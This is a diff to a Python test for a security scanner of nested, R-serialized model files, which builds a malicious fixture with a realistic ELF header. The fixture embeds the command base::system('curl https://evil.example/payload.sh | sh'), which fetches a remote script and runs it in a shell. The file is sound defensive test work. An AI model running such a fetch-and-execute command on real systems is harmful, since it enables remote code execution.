@@ -3254,10 +3254,15 @@ def test_scan_nested_file_merges_torch7_security_analysis_for_signature_valid_bi
 
 def test_scan_nested_file_merges_r_serialized_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
     extracted_member = tmp_path / "payload.bin"
+    elf_header = bytearray(b"\x00" * 64)
+    elf_header[:4] = b"\x7fELF"
+    elf_header[4:7] = b"\x02\x01\x01"
+    elf_header[16:18] = (2).to_bytes(2, "little")
+    elf_header[18:20] = (62).to_bytes(2, "little")
+    elf_header[20:24] = (1).to_bytes(4, "little")
     extracted_member.write_bytes(
         b"RDX3\nX\nworkspace\nmodel\nexpression\nlanguage\n"
-        b"base::system('curl https://evil.example/payload.sh | sh')\n"
-        b"\x7fELF" + b"\x00" * 128
+        b"base::system('curl https://evil.example/payload.sh | sh')\n" + bytes(elf_header) + b"\x00" * 64
     )
 
     result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
